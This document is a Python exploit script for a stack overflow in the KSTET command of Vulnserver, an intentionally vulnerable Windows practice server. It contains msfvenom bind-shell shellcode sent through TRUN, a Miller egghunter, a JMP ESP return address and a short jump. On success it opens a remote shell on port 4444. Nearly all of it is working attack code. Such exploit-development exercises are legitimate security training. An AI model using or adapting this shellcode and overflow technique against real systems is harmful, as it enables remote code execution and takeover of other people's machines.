#!/usr/bin/python 
# Vulnserver KSTET command stack overflow exploit for Windows 7 SP1 

import socket
import sys 

host = '192.168.1.115'
port = 666

# Need to send shell code using a seperate command to get it in memory 
# msfvenom -p windows/shell/bind_tcp -b "\x00" -a x86 -f python 
buf = "T00WT00W"
buf += "\xb8\xce\xbb\x5a\xd0\xd9\xeb\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x53\x83\xc7\x04\x31\x47\x0e\x03\x89\xb5\xb8"
buf += "\x25\xe9\x22\xbe\xc6\x11\xb3\xdf\x4f\xf4\x82\xdf\x34"
buf += "\x7d\xb4\xef\x3f\xd3\x39\x9b\x12\xc7\xca\xe9\xba\xe8"
buf += "\x7b\x47\x9d\xc7\x7c\xf4\xdd\x46\xff\x07\x32\xa8\x3e"
buf += "\xc8\x47\xa9\x07\x35\xa5\xfb\xd0\x31\x18\xeb\x55\x0f"
buf += "\xa1\x80\x26\x81\xa1\x75\xfe\xa0\x80\x28\x74\xfb\x02"
buf += "\xcb\x59\x77\x0b\xd3\xbe\xb2\xc5\x68\x74\x48\xd4\xb8"
buf += "\x44\xb1\x7b\x85\x68\x40\x85\xc2\x4f\xbb\xf0\x3a\xac"
buf += "\x46\x03\xf9\xce\x9c\x86\x19\x68\x56\x30\xc5\x88\xbb"
buf += "\xa7\x8e\x87\x70\xa3\xc8\x8b\x87\x60\x63\xb7\x0c\x87"
buf += "\xa3\x31\x56\xac\x67\x19\x0c\xcd\x3e\xc7\xe3\xf2\x20"
buf += "\xa8\x5c\x57\x2b\x45\x88\xea\x76\x02\x7d\xc7\x88\xd2"
buf += "\xe9\x50\xfb\xe0\xb6\xca\x93\x48\x3e\xd5\x64\xae\x15"
buf += "\xa1\xfa\x51\x96\xd2\xd3\x95\xc2\x82\x4b\x3f\x6b\x49"
buf += "\x8b\xc0\xbe\xe4\x83\x67\x11\x1b\x6e\xd7\xc1\x9b\xc0"
buf += "\xb0\x0b\x14\x3f\xa0\x33\xfe\x28\x49\xce\x01\x47\xd6"
buf += "\x47\xe7\x0d\xf6\x01\xbf\xb9\x34\x76\x08\x5e\x46\x5c"
buf += "\x20\xc8\x0f\xb6\xf7\xf7\x8f\x9c\x5f\x6f\x04\xf3\x5b"
buf += "\x8e\x1b\xde\xcb\xc7\x8c\x94\x9d\xaa\x2d\xa8\xb7\x5c"
buf += "\xcd\x3b\x5c\x9c\x98\x27\xcb\xcb\xcd\x96\x02\x99\xe3"
buf += "\x81\xbc\xbf\xf9\x54\x86\x7b\x26\xa5\x09\x82\xab\x91"
buf += "\x2d\x94\x75\x19\x6a\xc0\x29\x4c\x24\xbe\x8f\x26\x86"
buf += "\x68\x46\x94\x40\xfc\x1f\xd6\x52\x7a\x20\x33\x25\x62"
buf += "\x91\xea\x70\x9d\x1e\x7b\x75\xe6\x42\x1b\x7a\x3d\xc7"
buf += "\x3b\x99\x97\x32\xd4\x04\x72\xff\xb9\xb6\xa9\x3c\xc4"
buf += "\x34\x5b\xbd\x33\x24\x2e\xb8\x78\xe2\xc3\xb0\x11\x87"
buf += "\xe3\x67\x11\x82"



# Send the shell code so it get stored in memory for the egg hunter 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print("Sending shellcode to memory .....") 
s.send("TRUN "+ buf)
s.close() 


# Now build the exploit 
evil = "\x90" * 2 
evil += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # Using the standard miller egghunter which is coded to WOOTWOOT 
evil += "A" * (66-2-32) 
evil += "\xAF\x11\x50\x62"  # 0x625011AF in essfunc.dll JMP ESP
evil += "\xeb\xb8\x90\x90" # JMP 191F99A  
evil += "C" * (5005-66-4-4)

payload = "KSTET /.:/"+ evil 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print("Sending Ev1l payload..... check for bind shell on port 4444 ... ") 
s.send(payload)
print(s.recv(1024))
s.close() 


